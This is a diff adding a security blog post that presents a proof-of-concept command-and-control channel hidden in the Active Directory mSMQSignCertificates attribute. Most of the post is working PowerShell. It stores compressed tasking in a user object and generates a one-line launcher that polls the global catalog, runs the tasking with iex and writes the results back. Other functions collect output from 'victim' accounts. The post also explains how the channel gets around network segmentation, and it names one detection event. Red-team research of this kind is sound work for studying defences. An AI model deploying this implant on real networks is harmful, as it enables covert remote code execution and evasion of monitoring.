@@ -1,0 +1,531 @@
+<p>&#8216;Exotic&#8217; command and control (C2) channels always interest me. As defenses start to get more sophisticated, standard channels that have been stealthy before (like DNS) may start to lose their efficacy. I&#8217;m always on the lookout for non-obvious, one-way (or ideally two-way) communication methods. This post will cover a proof of concept for an internal C2 approach that uses standard Active Directory object properties in a default domain setup.</p>
+<h2>Active Directory Property Sets</h2>
+<p>This dawned on me when reviewing access control list entry information during <a href="https://www.blackhat.com/us-16/training/advanced-powershell-for-offensive-operations.html">training prep</a>. In a default domain setup, there is a set of ACLs for user objects that apply to the user itself, defined by the &#8216;NT AUTHORITY\SELF&#8217; IdentityReference. If you want to check these out for a sample domain, you can run the following <a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">PowerView</a> command:</p>
+<pre class="wrap:true lang:ps decode:true">PS C:\Users\harmj0y\Desktop&gt; Get-NetUser USER | Get-ObjectAcl -ResolveGUIDs |
+Where-Object {$_.IdentityReference -eq 'NT AUTHORITY\SELF'}</pre>
+<p>Here&#8217;s an interesting entry:</p>
+<p><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-3028" src="http://www.harmj0y.net/blog/wp-content/uploads/2016/06/personal_information_acl.png" alt="personal_information_acl" width="1394" height="445" srcset="https://blog.harmj0y.net/wp-content/uploads/2016/06/personal_information_acl.png 1394w, https://blog.harmj0y.net/wp-content/uploads/2016/06/personal_information_acl-300x96.png 300w, https://blog.harmj0y.net/wp-content/uploads/2016/06/personal_information_acl-768x245.png 768w, https://blog.harmj0y.net/wp-content/uploads/2016/06/personal_information_acl-1024x327.png 1024w" sizes="(max-width: 1394px) 100vw, 1394px" /></p>
+<p>So all users are able to write read and write to their own &#8220;Personal-Information&#8221; in Active Directory. This is what&#8217;s known as a <a href="https://www.microsoft.com/en-US/download/details.aspx?id=53314">property set</a> in AD, which were created to group specific common properties in order to reduce storage requirements on the Active Directory database. Unfortunately the material on that link has been archived, but if you download the document, page 8213 has more information on property sets in general, and <a href="https://msdn.microsoft.com/en-us/library/ms684394%28v=vs.85%29.aspx">this MSDN page</a> breaks out the members of the &#8220;Personal-Information&#8221; property set.</p>
+<p><span style="font-weight: 400;">Now let&#8217;s see which properties can hold the most data by examining the schema for the ‘user’ object in this domain:</span></p>
+<pre class="wrap:true lang:ps decode:true ">[DirectoryServices.ActiveDirectory.ActiveDirectorySchema]::GetCurrentSchema().FindClass('user').optionalproperties | select name,rangeupper | ?{$_.RangeUpper} | Sort-Object -Descending -Property rangeupper | Select -First 10</pre>
+<p><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-3029" src="http://www.harmj0y.net/blog/wp-content/uploads/2016/06/user_property_sizes.png" alt="user_property_sizes" width="1398" height="648" srcset="https://blog.harmj0y.net/wp-content/uploads/2016/06/user_property_sizes.png 1398w, https://blog.harmj0y.net/wp-content/uploads/2016/06/user_property_sizes-300x139.png 300w, https://blog.harmj0y.net/wp-content/uploads/2016/06/user_property_sizes-768x356.png 768w, https://blog.harmj0y.net/wp-content/uploads/2016/06/user_property_sizes-1024x475.png 1024w" sizes="(max-width: 1398px) 100vw, 1398px" /></p>
+<p>The above query will list ALL properties for a generic &#8216;user&#8217; object given the current domain schema, but not all of these properties are self-writable for a user. We want to choose the property with the largest storage limit that is also in &#8216;Personal Information&#8217; property set, which will give us the most flexibility with our communication channel. The <strong>mSMQSignCertificates</strong> field is interesting, as it has a 1MB upper size limit and meets all of our qualifications.<b> </b>Since every user can edit the <strong>mSMQSignCertificates</strong> property for their own user object, we have a nice 1MB two-way data channel (<strong>mSMQSignCertificatesMi</strong><strong>g</strong> is also interesting but not a member of &#8216;Personal Information&#8217;, so it&#8217;s not quite what we need at this point).</p>
+<p>Now what&#8217;s the best way to take advantage of this?</p>
+<h2>Weaponization</h2>
+<p>The use of <strong>mSMQSignCertificates </strong>gives us a one-to-many broadcast approach. One user changes their property field while other users continually query for that world-readable information, and then report results back through their own <strong>mSMQSignCertificates</strong> field. <span style="font-weight: 400;">This two-way 1MB channel is stored and propagated by Active Directory itself, which lends a few advantages. We never have to send packets directly to targets, and with some tweaking this should get around some network segmentation setups (see the </span><b>Bending Traffic Around Network Boundaries</b><span style="font-weight: 400;"> section below for caveats and more details).</span></p>
+<p>The proof of concept code below is <a href="https://gist.github.com/HarmJ0y/a219057e9d2faedf69d32e04c0f1874f">hosted on this gist</a>:</p>
+<pre class="height-set:true lang:ps decode:true " data-url="https://gist.githubusercontent.com/HarmJ0y/a219057e9d2faedf69d32e04c0f1874f/raw/5321a598618d1972e7ef6839149bed5093f8149f/ADC2.ps1">#Requires -Version 2
+
+function New-ADPayload {
+&lt;#
+    .SYNOPSIS
+
+        Stores PowerShell logic in the mSMQSignCertificates of the specified -TriggerAccount and generates
+        a one-line launcher.
+
+        Author: @harmj0y
+        License: BSD 3-Clause
+        Required Dependencies: None
+        Optional Dependencies: None
+
+    .DESCRIPTION
+
+        Takes a script block or PowerShell .ps1 file, compresses the data using IO.Compression.DeflateStream,
+        and stores the resulting bytes as a base64-encoded string in the mSMQSignCertificates field of the
+        specified -TriggerAccount, defaulting to the current user. Also generates a one-line launcher that checks
+        for data in mSMQSignCertificates of the specified user on a timed interval, executing logic if it exists
+        and storing the results in mSMQSignCertificates for the current user.
+
+    .PARAMETER ScriptBlock
+
+        Script block to store in the mSMQSignCertificates field for the specified user.
+
+    .PARAMETER Path
+
+        Path of a PowerShell .ps1 script to store in the mSMQSignCertificates field for the specified user.
+
+    .PARAMETER TriggerAccount
+
+        The user account to store the compressed logic in, defaults to the current user ([Environment]::UserName).
+        Also accepts distinguishedname syntax (e.g. 'CN=harmj0y,CN=Users,DC=testlab,DC=local').
+
+    .PARAMETER SleepSeconds
+
+        The number of seconds to sleep between checks for the mSMQSignCertificates property, default
+        of 60 seconds.
+
+    .EXAMPLE
+
+        PS C:\&gt; New-ADPayload -Path C:\Temp\malicious.ps1
+
+        Store a malicious PowerShell script into the mSMQSignCertificates property for the current user and output
+        the launcher code in a custom object.
+
+    .EXAMPLE
+
+        PS C:\&gt; New-ADPayload -ScriptBlock {gci C:\} -Verbose
+
+        Store the specified scriptblock into the mSMQSignCertificates property for the current user and output
+        the launcher code in a custom object.
+
+    .EXAMPLE
+
+        PS C:\&gt; {gci C:\} | New-ADPayload
+
+        Store the specified scriptblock into the mSMQSignCertificates property for the current user and output
+        the launcher code in a custom object.
+
+    .EXAMPLE
+
+        PS C:\&gt; New-ADPayload -ScriptBlock {gci C:\Users\} -TriggerAccount mnelson -SleepSeconds 300 -Verbose
+
+        Store the specified scriptblock into the mSMQSignCertificates property for 'mnelson' user and output
+        the launcher code (utilizing a 5 minute sleep internval instead of 60 seconds) in a custom object.
+#&gt;
+    [CmdletBinding(DefaultParameterSetName = 'ScriptBlock')]
+    Param (
+        [Parameter(ParameterSetName = 'ScriptBlock', Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
+        [ValidateNotNullOrEmpty()]
+        [ScriptBlock]
+        $ScriptBlock,
+
+        [Parameter(ParameterSetName = 'FilePath', Position = 0, Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
+        [ValidateScript({Test-Path -Path $_ })]
+        [Alias('FilePath', 'FullName')]
+        [String]
+        $Path,
+
+        [Parameter(Position = 1)]
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $TriggerAccount = [Environment]::UserName,
+
+        [Parameter(Position = 2)]
+        [ValidateNotNullOrEmpty()]
+        [Int]
+        $SleepSeconds = 60
+    )
+
+    PROCESS {
+        # get the raw bytes for the logic to store
+        if($PSBoundParameters['Path']) {
+            try {
+                $Null = Get-ChildItem -Path $Path -ErrorAction Stop
+                $ScriptBytes = [IO.File]::ReadAllBytes((Resolve-Path -Path $Path))
+            }
+            catch {
+                throw "Error reading byte from file: $Path"
+            }
+        }
+        else {
+            $ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($ScriptBlock)
+        }
+
+        # compress the data using DeflateStream
+        $CompressedStream = New-Object IO.MemoryStream
+        $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
+        $DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
+        $DeflateStream.Dispose()
+        $CompressedScriptBytes = $CompressedStream.ToArray()
+        $CompressedStream.Dispose()
+        $EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)
+
+        $Searcher = [adsisearcher]''
+
+        if($TriggerAccount.Contains(',')) {
+            $Searcher.Filter = "(distinguishedname=$TriggerAccount)"
+        }
+        else {
+            $Searcher.Filter = "(samaccountname=$TriggerAccount)"
+        }
+        $Searcher.CacheResults = $False
+        $User = $Searcher.FindOne()
+
+        # grab the user object we're storing the trigger payload in
+        if($User) {
+            try {
+                $UserEntry = $User.GetDirectoryEntry()
+                $UserDN = $User.Properties.distinguishedname[0]
+                $Null = $UserEntry.Put('mSMQSignCertificates', $EncodedCompressedScript)
+                $Null = $UserEntry.SetInfo()
+                Write-Verbose "Payload stored in 'mSMQSignCertificates' parameter for $UserDN"
+
+                &lt;#
+                The expanded trigger logic:
+
+                    sal a New-Object;
+                    $DC=([ADSI]'LDAP://RootDSE').dnshostname;
+                    $OC=''; # original command
+                    while($True) {
+                        Start-Sleep $SleepSeconds;
+                        $S=[adsisearcher][adsi]"GC://$DC";
+                        $S.Filter="(&amp;(distinguishedname=$UserDN)(mSMQSignCertificates=*))";
+                        $S.CacheResults=$False;
+                        $U=$S.FindOne();
+
+                        if(!$u){continue};
+
+                        $C=[System.Text.Encoding]::ASCII.GetString($u.properties.msmqsigncertificates[0]);
+
+                        # if there's a new tasking command
+                        if($C -and ($C -ne '') -and ($C -ne $OC)){
+                            $OC=$C;
+                            # base64-decode/decompress the command and trigger it
+                            $SB=([Text.Encoding]::ASCII).GetBytes($(iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($C),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd() | Out-String));
+                            $CS=a IO.MemoryStream;
+                            # compress/base64-encde the results
+                            $DS=a IO.Compression.DeflateStream($CS,[IO.Compression.CompressionMode]::Compress);
+                            $DS.Write($SB,0,$SB.Length);$DS.Dispose();$CS.Dispose();$R2 = [Convert]::ToBase64String($CS.ToArray());
+                            # current user
+                            $CU=([adsisearcher]"(samaccountname=$([Environment]::UserName))").FindOne().GetDirectoryEntry();
+                            # put the results in the current user's 'mSMQSignCertificates' field
+                            $CU.Put('mSMQSignCertificates',$R2);$CU.SetInfo();
+                        }
+                    }
+                #&gt;
+
+                $TriggerScript = "sal a New-Object;`$DC=([ADSI]'LDAP://RootDSE').dnshostname;`$OC='';while(`$True) {Start-Sleep $SleepSeconds;`$S=[adsisearcher][adsi]`"GC://`$DC`";`$S.Filter=`"(&amp;(distinguishedname=$UserDN)(mSMQSignCertificates=*))`";`$S.CacheResults=`$False;`$U=`$S.FindOne();if(!`$u){continue};`$C=[System.Text.Encoding]::ASCII.GetString(`$u.properties.msmqsigncertificates[0]);if(`$C -and (`$C -ne '') -and (`$C -ne `$OC)){`$OC=`$C;`$SB=([Text.Encoding]::ASCII).GetBytes(`$(iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(`$C),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd() | Out-String));`$CS=a IO.MemoryStream;`$DS=a IO.Compression.DeflateStream(`$CS,[IO.Compression.CompressionMode]::Compress);`$DS.Write(`$SB,0,`$SB.Length);`$DS.Dispose();`$CS.Dispose();`$R2 = [Convert]::ToBase64String(`$CS.ToArray());`$CU=([adsisearcher]`"(samaccountname=`$([Environment]::UserName))`").FindOne().GetDirectoryEntry();`$CU.Put('mSMQSignCertificates',`$R2);`$CU.SetInfo();}}"
+
+                New-Object -TypeName PSObject -Property @{
+                    TriggerAccount = $UserDN
+                    EncodedPayload = $EncodedCompressedScript
+                    TriggerScript = $TriggerScript
+                    SleepSeconds = $SleepSeconds
+                }
+            }
+            catch {
+                Write-Error "Error setting mSMQSignCertificates for samaccountname: '$TriggerAccount' : $_"
+            }
+        }
+        else {
+            Write-Error "Error finding samaccountname '$TriggerAccount' : $_"
+        }
+    }
+}
+
+
+function Get-ADPayload {
+&lt;#
+    .SYNOPSIS
+
+        Retrieves the script payload stored in the mSMQSignCertificates of the specified -TriggerAccount.
+
+        Author: @harmj0y
+        License: BSD 3-Clause
+        Required Dependencies: None
+        Optional Dependencies: None
+
+    .DESCRIPTION
+
+        Retrieves the script payload stored in the mSMQSignCertificates of the specified -TriggerAccount,
+        base64-decodes and decompresses the logic, outputting everything as a custom PS object. For users in
+        a foreign domain, use "user@domain.com" syntax.
+
+    .PARAMETER TriggerAccount
+
+        The user account to store the compressed logic in, defaults to the current user ([Environment]::UserName).
+        Also accepts distinguishedname syntax (e.g. 'CN=harmj0y,CN=Users,DC=testlab,DC=local').
+
+    .EXAMPLE
+
+        PS C:\&gt; Get-ADPayload
+
+        TriggerAccount                Payload                       EncodedPayload
+        --------------                -------                       --------------
+        CN=harmj0y,CN=Users,DC=tes... dir C:\                       7b0HYBxJliUmL23Ke39K9UrX4H...
+
+    .EXAMPLE
+
+        PS C:\&gt; Get-ADPayload -TriggerAccount mnelson
+
+        TriggerAccount                Payload                       EncodedPayload
+        --------------                -------                       --------------
+        CN=mnelson,CN=Users,DC=tes... dir C:\                       7b0HYBxJliUmL23Ke39K9UrX4H...
+
+    .EXAMPLE
+
+        PS C:\&gt; 'CN=harmj0y,CN=Users,DC=testlab,DC=local' | Get-ADPayload
+
+        TriggerAccount                Payload                       EncodedPayload
+        --------------                -------                       --------------
+        CN=harmj0y,CN=Users,DC=tes... dir C:\                       7b0HYBxJliUmL23Ke39K9UrX4H...
+#&gt;
+    [CmdletBinding()]
+    Param (
+        [Parameter(Position = 0, ValueFromPipeline = $True)]
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $TriggerAccount = [Environment]::UserName
+    )
+
+    PROCESS {
+
+        if($PSBoundParameters['TriggerAccount']) {
+            # get this machine's logon domain controller
+            $GlobalCatalog = ([ADSI]'LDAP://RootDSE').dnshostname
+            $Searcher = [adsisearcher][adsi]"GC://$GlobalCatalog"
+            Write-Verbose "Using the global catalog at GC://$($GlobalCatalog)"
+        }
+        else {
+            # if using the current user, just search the current domain
+            $Searcher = [adsisearcher]''
+        }
+
+        if($TriggerAccount.Contains(',')) {
+            $Searcher.Filter = "(distinguishedname=$TriggerAccount)"
+        }
+        else {
+            $Searcher.Filter = "(samaccountname=$TriggerAccount)"
+        }
+        $Searcher.CacheResults = $False
+        $User = $Searcher.FindOne()
+
+        if($User) {
+            try {
+                if($User.properties.msmqsigncertificates) {
+                    $RawCommand = [System.Text.Encoding]::ASCII.GetString($User.properties.msmqsigncertificates[0])
+
+                    $Payload = (New-Object IO.StreamReader((New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($RawCommand),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()
+
+                    New-Object -TypeName PSObject -Property @{
+                        TriggerAccount = $User.properties.distinguishedname[0]
+                        EncodedPayload = $RawCommand
+                        Payload = $Payload
+                    }
+                }
+                else {
+                    Write-Verbose "No payload stored for $TriggerAccount"
+                }
+            }
+            catch {
+                Write-Error "Error retrieving mSMQSignCertificates for samaccountname '$TriggerAccount' : $_"
+            }
+        }
+        else {
+            Write-Error "Error finding samaccountname '$TriggerAccount' : $_"
+        }
+    }
+}
+
+
+function Remove-ADPayload {
+&lt;#
+    .SYNOPSIS
+
+        Removes the script payload stored in the mSMQSignCertificates of the specified -TriggerAccount.
+
+        Author: @harmj0y
+        License: BSD 3-Clause
+        Required Dependencies: None
+        Optional Dependencies: None
+
+    .DESCRIPTION
+
+        Removes the script payload stored in the mSMQSignCertificates of the specified -TriggerAccount.
+
+    .PARAMETER TriggerAccount
+
+        The user account to store the remove the trigger from, defaults to the current user ([Environment]::UserName).
+        Also accepts distinguishedname syntax (e.g. 'CN=harmj0y,CN=Users,DC=testlab,DC=local').
+
+    .EXAMPLE
+
+        PS C:\&gt; Remove-ADPayload
+
+        Removes the payload stored for the current user.
+
+    .EXAMPLE
+
+        PS C:\&gt; Remove-ADPayload -TriggerAccount mnelson
+
+        Removes the payload stored for the 'mnelson' user.
+
+    .EXAMPLE
+
+        PS C:\&gt; $Payload = Get-ADPayload
+        PS C:\&gt; $Payload | Remove-ADPayload
+
+        Retrieve the AD payload for the current user and then remove it.
+
+    .EXAMPLE
+
+        PS C:\&gt; $Payload = {gci C:\} | New-ADPayload
+        PS C:\&gt; $Payload | Remove-ADPayload
+
+        Create a new AD payload and then remove it.
+#&gt;
+    [CmdletBinding()]
+    Param (
+        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
+        [ValidateNotNullOrEmpty()]
+        [Alias('cn', 'username')]
+        [String]
+        $TriggerAccount = [Environment]::UserName
+    )
+
+    PROCESS {
+
+        $Searcher = [adsisearcher]''
+
+        if($TriggerAccount.Contains(',')) {
+            $Searcher.Filter = "(distinguishedname=$TriggerAccount)"
+        }
+        else {
+            $Searcher.Filter = "(samaccountname=$TriggerAccount)"
+        }
+        $Searcher.CacheResults = $False
+        $User = $Searcher.FindOne()
+
+        if($User) {
+            try {
+                $UserEntry = $User.GetDirectoryEntry()
+
+                # weird way to clear the entry
+                $UserEntry.PutEx(1, 'mSMQSignCertificates', 0)
+
+                $UserEntry.SetInfo()
+
+                Write-Verbose "Removed mSMQSignCertificates property for '$($User.properties.distinguishedname[0])"
+            }
+            catch {
+                Write-Error "Error retrieving mSMQSignCertificates for samaccountname '$($User.properties.distinguishedname[0])' : $_"
+            }
+        }
+        else {
+            Write-Error "Error finding samaccountname '$TriggerAccount' : $_"
+        }
+    }
+}
+
+
+function Get-ADPayloadResult {
+&lt;#
+    .SYNOPSIS
+
+        Retrieves the results of any clients who executed the broadcast logic from New-ADPayload.
+
+        Author: @harmj0y
+        License: BSD 3-Clause
+        Required Dependencies: None
+        Optional Dependencies: None
+
+    .DESCRIPTION
+
+        Queries all users EXCEPT the -TriggerAccount used to broadcast the script logic (default of [Environment]::UserName),
+        extracts out the compressed logic and displays the per-user results. If a -TriggerAccount value is specified,
+        the global catalog is searched for all results (instead of just the current domain)/
+
+    .PARAMETER TriggerAccount
+
+        The user account used to store the broadcast trigger, defaults to the current user.
+        Also accepts distinguishedname syntax (e.g. 'CN=harmj0y,CN=Users,DC=testlab,DC=local').
+
+    .EXAMPLE
+
+        PS C:\&gt; Get-ADPayloadResult | fl
+
+        TriggerAccount : harmj0y
+        Results        :
+
+                            Directory: C:\
+
+
+                        Mode                LastWriteTime     Length Name
+
+                        ----                -------------     ------ ----
+
+                        d----         7/13/2009   8:20 PM            PerfLogs
+
+                        d-r--          8/9/2016  11:07 AM            Program Files
+
+                        d-r--         7/13/2009  10:08 PM            Program Files (x86)
+
+                        d-r--         8/12/2016  11:49 AM            Users
+
+                        d----          8/9/2016  11:48 AM            Windows
+
+        VictimAccount  : CN=Justin Warner,CN=Users,DC=testlab,DC=local
+
+
+        Gathers results from all users (except the current user) with mSMQSignCertificates set.
+
+    .EXAMPLE
+
+        PS C:\&gt; Get-ADPayloadResult -Verbose -TriggerAccount harmj0y
+        VERBOSE: Using the global catalog at GC://PRIMARY.testlab.local
+
+        TriggerAccount                Results                       VictimAccount
+        --------------                -------                       -------------
+        harmj0y                       ...                           CN=Justin Warner,CN=Users,...
+        harmj0y                       ...                           CN=user1,CN=Users,DC=dev,D...
+
+
+        Gathers results from all users (except 'harmj0y') with mSMQSignCertificates set by searching the
+        global catalog.
+#&gt;
+    [CmdletBinding()]
+    Param (
+        [Parameter(ValueFromPipeline = $True)]
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $TriggerAccount = [Environment]::UserName
+    )
+
+    PROCESS {
+
+        if($PSBoundParameters['TriggerAccount']) {
+            # get this machine's logon domain controller
+            $GlobalCatalog = ([ADSI]'LDAP://RootDSE').dnshostname
+            $Searcher = [adsisearcher][adsi]"GC://$GlobalCatalog"
+            Write-Verbose "Using the global catalog at GC://$($GlobalCatalog)"
+        }
+        else {
+            # if using the current user, just search the current domain
+            $Searcher = [adsisearcher]''
+        }
+
+        if($TriggerAccount.Contains(',')) {
+            $Searcher.Filter = "(&amp;(!distinguishedname=$TriggerAccount)(mSMQSignCertificates=*))"
+        }
+        else {
+            $Searcher.Filter = "(&amp;(!samaccountname=$TriggerAccount)(mSMQSignCertificates=*))"
+        }
+        $Searcher.CacheResults = $False
+
+        ForEach($User in $Searcher.FindAll()) {
+            try {
+                $Raw = [System.Text.Encoding]::ASCII.GetString($User.properties.msmqsigncertificates[0])
+                $Results = (New-Object IO.StreamReader((New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($([System.Text.Encoding]::ASCII.GetString($User.properties.msmqsigncertificates[0]))),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()
+
+                New-Object -TypeName PSObject -Property @{
+                    TriggerAccount = $TriggerAccount
+                    VictimAccount = $User.properties.distinguishedname[0]
+                    Results = $Results
+                }
+            }
+            catch {
+                Write-Error "Error retrieving results from 'mSMQSignCertificates': $_"
+            }
+        }
+    }
+}</pre>
+<p>Use <strong><span class="pl-en">New-ADPayload</span></strong><span class="pl-en"> to register a new broadcast trigger for the current (or specified) user and output a one-line launcher in a custom PSObject. This launcher is usable from any user logged on anywhere in the forest (more on this at the end of the post). All code taskings and results are compressed using .NET&#8217;s <a href="https://msdn.microsoft.com/en-us/library/system.io.compression.deflatestream%28v=vs.110%29.aspx?f=255&amp;MSPPError=-2147217396">[IO.Compression.DeflateStream]</a> in order to save on space, and then base64&#8217;ed before being stored in the <strong>mSMQSignCertificates</strong> property of the target user.</span></p>
+<p><img loading="lazy" decoding="async" class="aligncenter size-large wp-image-3374" src="http://www.harmj0y.net/blog/wp-content/uploads/2016/08/ad_payload_new-1024x618.png" alt="ad_payload_new" width="640" height="386" srcset="https://blog.harmj0y.net/wp-content/uploads/2016/08/ad_payload_new-1024x618.png 1024w, https://blog.harmj0y.net/wp-content/uploads/2016/08/ad_payload_new-300x181.png 300w, https://blog.harmj0y.net/wp-content/uploads/2016/08/ad_payload_new-768x464.png 768w, https://blog.harmj0y.net/wp-content/uploads/2016/08/ad_payload_new.png 1698w" sizes="(max-width: 640px) 100vw, 640px" /></p>
+<p>After the TriggerScript logic is launched on a target host, u<span style="line-height: 1.5;">se <strong>Get-ADPayloadResult</strong> to query all users EXCEPT the <strong>-TriggerAccount</strong> used to broadcast the script logic (default of [Environment]::UserName), extract out the compressed data, and display the per-user results.</span></p>
+<p><img loading="lazy" decoding="async" class="aligncenter size-large wp-image-3375" src="http://www.harmj0y.net/blog/wp-content/uploads/2016/08/ad_payload_result-1024x610.png" alt="ad_payload_result" width="640" height="381" srcset="https://blog.harmj0y.net/wp-content/uploads/2016/08/ad_payload_result-1024x610.png 1024w, https://blog.harmj0y.net/wp-content/uploads/2016/08/ad_payload_result-300x179.png 300w, https://blog.harmj0y.net/wp-content/uploads/2016/08/ad_payload_result-768x458.png 768w, https://blog.harmj0y.net/wp-content/uploads/2016/08/ad_payload_result.png 1683w" sizes="(max-width: 640px) 100vw, 640px" /></p>
+<p><strong>Get-ADPayload</strong> will retrieve any payload stored in <strong>mSMQSignCertificates</strong> for the given -TriggerAccount (defaulting to the current user) and <strong>Remove-ADPayload</strong> will remove the script payload:</p>
+<p><img loading="lazy" decoding="async" class="aligncenter size-large wp-image-3376" src="http://www.harmj0y.net/blog/wp-content/uploads/2016/08/ad_payload_removal-1024x220.png" alt="ad_payload_removal" width="640" height="138" srcset="https://blog.harmj0y.net/wp-content/uploads/2016/08/ad_payload_removal-1024x220.png 1024w, https://blog.harmj0y.net/wp-content/uploads/2016/08/ad_payload_removal-300x64.png 300w, https://blog.harmj0y.net/wp-content/uploads/2016/08/ad_payload_removal-768x165.png 768w, https://blog.harmj0y.net/wp-content/uploads/2016/08/ad_payload_removal.png 1689w" sizes="(max-width: 640px) 100vw, 640px" /></p>
+<h2>Bending Traffic Around Network Boundaries</h2>
+<p>As I mentioned briefly, one of the coolest side effects of this approach is that you can get around some network segmentation setups, assuming that the broadcast user and victim user are in the same forest. While I&#8217;m not going to go deep into <a href="http://www.harmj0y.net/blog/tag/domain-trusts/">domain trusts</a>, I&#8217;ll cover a few quick points. Check out <a href="https://twitter.com/pyrotek3">Sean Metcalf</a>&#8216;s 2016 <a href="https://adsecurity.org/?page_id=1352">BlackHat/DEF CON &#8220;Beyond the MCSE*&#8221; presentations</a> for more information.<br />
+<b></b></p>
+<p>An Active Directory global catalog is a, &#8220;<a href="https://technet.microsoft.com/en-us/library/cc730749%28v=ws.11%29.aspx"><em>a domain controller that stores a full copy of all objects in the directory for its host domain and a partial, read-only copy of all objects for all other domains in the forest</em></a>&#8220;. Not all object properties are replicated, but rather only properties in the &#8220;partial attribute set&#8221; defined in the domain schema. We can enumerate all the schema objects by using the &#8220;<strong>(isMemberOfPartialAttributeSet=TRUE)</strong>&#8221; LDAP filter, for example using PowerView:</p>
+<pre class="wrap:true lang:ps decode:true">Get-ADObject -ADSPath "CN=Schema,CN=Configuration,DC=testlab,DC=local" -Filter "(isMemberOfPartialAttributeSet=TRUE)" | Select name</pre>
+<p>And luckily for us, the <strong>mSMQSignCertificates</strong> field is included in the partial attribute set for the default schema! This is also <a href="https://msdn.microsoft.com/en-us/library/ms677900(v=vs.85).aspx#win_8_server">documented by Microsoft here</a>.</p>
+<p><img loading="lazy" decoding="async" class="aligncenter size-large wp-image-3378" src="http://www.harmj0y.net/blog/wp-content/uploads/2016/08/partial_attribute_set2-1024x772.png" alt="partial_attribute_set2" width="640" height="483" srcset="https://blog.harmj0y.net/wp-content/uploads/2016/08/partial_attribute_set2-1024x772.png 1024w, https://blog.harmj0y.net/wp-content/uploads/2016/08/partial_attribute_set2-300x226.png 300w, https://blog.harmj0y.net/wp-content/uploads/2016/08/partial_attribute_set2-768x579.png 768w, https://blog.harmj0y.net/wp-content/uploads/2016/08/partial_attribute_set2.png 1700w" sizes="(max-width: 640px) 100vw, 640px" /></p>
+<p>Any time we modify the <strong>mSMQSignCertificates</strong> field for a user, that data should propagate to all copies of the global catalog in the forest. So even if our trigger or victim users can&#8217;t reach each others&#8217; domains directly due to proper network segmentation, as long as the global catalog is allowed to replicate, we have a basic two-way channel between any two users in a forest (as long as each user can reach their normal domain controller/global catalog).</p>
+<p>We can read our &#8216;broadcast&#8217; traffic through the global catalog, but we can&#8217;t write to attributes using this method; overall we don&#8217;t care since the default behavior is for each user to modify their own <strong>mSMQSignCertificates</strong> in their current domain. We&#8217;re also at the mercy of the replication speed of the global catalog, so while this channel is reasonably sized (1MB), it&#8217;s not going to be practical for interactive communications.</p>
+<p>For the proof of concept code in this post, the <strong>TriggerScript</strong> generated by <strong>New-ADPayload</strong> will automatically query the victim&#8217;s global catalog for the trigger account. <strong>Get-ADPayload</strong> and <strong>Get-ADPayloadResult</strong> by default will query only the current domain, unless a <strong>-TriggerAccount X</strong> argument is passed, in which case the global catalog is searched. The following screenshot shows results from users in two domains in the forest, where the machine each user is currently on is explicitly disallowed from direct communication with the foreign domain controller:</p>
+<p><img loading="lazy" decoding="async" class="aligncenter size-large wp-image-3379" src="http://www.harmj0y.net/blog/wp-content/uploads/2016/08/forest_result-1024x166.png" alt="forest_result" width="640" height="104" srcset="https://blog.harmj0y.net/wp-content/uploads/2016/08/forest_result-1024x166.png 1024w, https://blog.harmj0y.net/wp-content/uploads/2016/08/forest_result-300x49.png 300w, https://blog.harmj0y.net/wp-content/uploads/2016/08/forest_result-768x125.png 768w, https://blog.harmj0y.net/wp-content/uploads/2016/08/forest_result.png 1694w" sizes="(max-width: 640px) 100vw, 640px" /></p>
+<p>As far as defensive mitigations go, <a href="https://twitter.com/carlos_perez">Carlos Perez</a> pointed me to the &#8220;<a href="https://technet.microsoft.com/en-us/library/dd772641%28v=ws.10%29.aspx?f=255&amp;MSPPError=-2147217396">Audit Directory Service Changes</a>&#8221; AD policy. With this auditing policy enabled, changes to an active directory object will produce an event with ID 5136, meaning &#8220;a directory service object was modified&#8221;. This should let you track the modifications of object fields like <strong>mSMQSignCertificates</strong>. There&#8217;s more information on this event ID <a href="https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=5136">in this article</a>.</p>
+<p>As a last note, the proof of concept code doesn&#8217;t implement any encryption (though this would be relatively simple), so I wouldn&#8217;t recommend using it in its unmodified state on engagements.</p>
+<p>Have fun :D</p>
